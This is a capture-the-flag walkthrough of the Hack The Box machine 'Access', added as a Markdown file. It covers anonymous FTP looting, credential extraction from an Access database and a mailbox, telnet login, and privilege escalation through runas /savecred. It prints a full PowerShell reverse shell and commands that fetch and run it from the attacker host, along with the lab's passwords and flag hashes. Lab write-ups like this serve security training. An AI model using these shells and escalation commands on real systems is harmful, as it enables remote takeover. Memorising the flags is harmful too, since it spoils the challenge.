@@ -1,0 +1,167 @@
+# HTB: Access
+- Date completed: July 28, 2025
+- Difficulty: Easy
+- Methodology: Credential harvesting -> shell access through telnet -> privesc through misconfigured runas.
+
+#RECON
+
+Simple Nmap scan:
+
+kali@kali:~/HTB/CTF/aCc3s5/Nmap-Scan$ sudo nmap -sS --top-ports 1000 10.129.189.57                  
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+23/tcp open  telnet
+
+Downloading Microsoft Access Database (.mdb) file from the FTP server:
+
+kali@kali:~/HTB/CTF/aCc3s5$ ftp 10.129.189.57                                                       
+
+Name (10.129.189.57:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+
+ftp> binary
+200 Type set to I.
+ftp> get backup.mdb
+
+Downloading the zip file on the FTP servcer:
+
+ftp> get "access control.zip"
+
+Inspecting the .mdb file:
+
+kali@kali:~/HTB/CTF/aCc3s5$ mdb-tables backup.mdb                                                   
+
+There is a lot of output, but the table to pay attention to is:
+
+auth_user
+
+Querying the auth_user table:
+
+kali@kali:~/HTB/CTF/aCc3s5$ mdb-export backup.mdb auth_user                                         
+id,username,password,Status,last_login,RoleID,Remark
+27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
+
+We've got a plaintext password. We find this password can be used to unzip the encrypted zip file:
+
+kali@kali:~/HTB/CTF/aCc3s5$ 7z x 'access control.zip' -paccess4u@security                            
+
+This creates a .pst file:
+
+kali@kali:~/HTB/CTF/aCc3s5$ ls                                                                       
+'Access Control.pst'
+
+In order to interact with the .pst file we need libpst and we can use it as such:
+
+First we have to create a directory for the .pst file to be written to:
+
+kali@kali:~/HTB/CTF/aCc3s5$ mkdir extracted-pst 
+
+Then we can extract the .pst file: 
+
+kali@kali:~/HTB/CTF/aCc3s5$ readpst 'Access Control.pst' -o extracted-pst                            
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+        "Access Control" - 2 items done, 0 items skipped.
+
+Navigating to the extracted-pst directory we find there's an .mbox file which is just a text file:
+
+We find credentials inside of the .mbox file: 
+
+The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller
+
+Using those credentials we are able to log into the telnet service hosted on port 23:
+
+kali@kali:~/HTB/CTF/aCc3s5$ telnet 10.129.189.57 23                                                  
+Trying 10.129.189.57...
+Connected to 10.129.189.57. 
+
+login: security
+password: 
+
+*===============================================================
+Microsoft Telnet Server.
+*===============================================================
+C:\Users\security>       
+
+Getting the user.txt file: 
+
+C:\Users\security\Desktop>type user.txt
+65a8c6064e629ec19a34c9e7b1b6bfa2
+
+Upon recon for privesc vectors, we find an interesting .lnk file in the public desktop:
+
+08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
+
+Being that we are in a restricted telnet cmd shell, we need upgrade:
+
+First we create a reverse shell:
+
+kali@kali:~/HTB/CTF/aCc3s5$ cat shell.ps1                                                            
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.112",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+Then we host the file on port 80 with php:
+
+kali@kali:~/HTB/CTF/aCc3s5$ php -S 0.0.0.0:80    
+
+#FOOTHOLD
+
+On the target machine we run:
+
+C:\Users\Public\Desktop>START /B "" powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.112/shell.ps1')
+
+On our server we see:
+
+[Mon Jul 28 10:56:41 2025] 10.129.189.57:49157 Accepted
+[Mon Jul 28 10:56:41 2025] 10.129.189.57:49157 [200]: GET /shell.ps1
+[Mon Jul 28 10:56:41 2025] 10.129.189.57:49157 Closing
+
+And on our listener we recieve a connection.
+
+Now that we've upgraded our shell we can now run powershell commands to figure out what the .lnk file is pointing to:
+
+PS C:\Users\Public\Desktop> $lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk")
+$lnk.TargetPathPS C:\Users\Public\Desktop> 
+C:\Windows\System32\runas.exe
+
+Seeing that it's pointing to runas we then move to see if there's any stored credentials:
+
+cmdkey /list returns this:
+
+Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+    Type: Domain Password
+    User: ACCESS\Administrator
+
+This tells us that the admin user's creds are being stored.
+
+#PRIVESC
+
+Knowing that we have stored credentials we can use this command to gain access to the admin account using the same shell.ps1 script we created with a listener on our machine at 443:
+
+PS C:\Users\Public\Desktop> runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.112/shell.ps1')"
+
+On our listener: 
+
+kali@kali:~/HTB/CTF/aCc3s5$ nc -nvlp 443                                                             
+listening on [any] 443 ...
+connect to [10.10.14.112] from (UNKNOWN) [10.129.189.57] 49162
+whoami
+access\administrator
+
+Getting root.txt file:
+
+PS C:\users\administrator\desktop> type root.txt
+0cd39e6a07691cd2f8dfc101fdf32513
+
+#FLAGS
+
+user.txt : 65a8c6064e629ec19a34c9e7b1b6bfa2
+root.txt : 0cd39e6a07691cd2f8dfc101fdf32513  
+
+#SUMMARY
+
+Initial enumeration revealed FTP and Telnet services. An anonymous FTP login provided access to a Microsoft Access database (backup.mdb) and an encrypted ZIP file. Parsing the .mdb file exposed plaintext credentials, which successfully unlocked the ZIP archive. Inside was a .pst file containing an email with updated credentials for the security user. Using those credentials, a Telnet shell was established. A .lnk shortcut found on the Public desktop was determined to invoke runas.exe. PowerShell enumeration showed saved credentials for the ACCESS\Administrator account. This was exploited using runas /savecred to launch a PowerShell reverse shell as Administrator. The elevated shell provided access to root.txt.
